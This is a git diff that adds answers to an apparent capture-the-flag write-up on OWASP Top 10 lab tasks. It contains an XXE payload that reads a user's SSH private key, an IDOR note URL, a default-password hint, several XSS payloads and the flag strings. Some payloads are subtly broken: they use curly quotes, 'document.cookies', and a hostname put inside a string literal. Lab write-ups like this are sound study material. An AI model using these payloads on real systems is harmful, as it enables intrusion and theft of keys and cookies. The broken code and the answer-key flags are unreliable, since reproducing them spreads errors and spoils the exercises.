@@ -191,18 +191,27 @@ Answer: Completed without answer
 ### 16.3
 What is the name of the user in /etc/passwd
 <br/>
-Answer:
+Answer: falcon
 
 ### 16.4
 Where is falcon's SSH key located?
 <br/>
-Answer:
+"Command": knowledge from checking what the basic name of an ssh key is
+<br/>
+Answer: /home/falcon/.ssh/id_rsa
 
 ### 16.5
 What are the first 18 characters for falcon's private key
 <br/>
-Answer:
-
+XMLParser: 
+<br/>
+<?xml version="1.0"?>
+<br/>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
+<br/>
+<root>&read;</root>
+<br/>
+Answer: MIIEogIBAAKCAQEA7
 
 ## Task 17: [Severity 5] Broken Access Control
 Just Reading
@@ -220,7 +229,9 @@ Answer: Completed without answer
 ### 18.3
 Look at other users notes. What is the flag?
 <br/>
-Answer:
+Flag location: MachineIP/note.php?note=0
+<br/>
+Answer: flag{fivefourthree} 
 
 ## Task 19: [Severity 6] Security Misconfiguration
 ### 19.1
@@ -231,7 +242,9 @@ Answer: Completed without answer
 ### 19.2
 Hack into the webapp, and find the flag!
 <br/>
-Answer: 
+Search google for Pensive Notes default password
+<br/>
+Answer: thm{4b9513968fd564a87b28aa1f9d672e17}
 
 ## Task 20: [Severity 7] Cross-site Scripting
 
@@ -245,27 +258,34 @@ Answer: Completed without answer
 
 Navigate to http://MACHINE_IP/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".
 <br/>
-Answer: 
-
+Command: (<script>alert(“Hello”)</script>)
+<br/>
+Answer: ThereIsMoreToXSSThanYouThink
 ### 20.3
 On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
 <br/>
-Answer: 
+Command: (<script>alert(“window.location.hostname”)</script>)
+<br/>
+Answer: ReflectiveXss4TheWin
 
 ### 20.4
 Then add a comment and see if you can insert some of your own HTML.
 <br/>
-Answer: 
+Command: (<script>document.writeln(<title>Page Title</title>) </script>)
+<br/>
+Answer: HTML_T4gs
 
 ### 20.5
 On the same page, create an alert popup box appear on the page with your document cookies.
 <br/>
-Answer: 
+Command: (<script>alert(document.cookies)</script>)
+<br/>
+Answer: W3LL_D0N3_LVL2S
 
 ### 20.6
 Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
 <br/>
-Answer: 
+Answer:  websites_can_be_easily_defaced_with_xss
 
 
 ## Task 21: [Severity 8] Insecure Deserialization
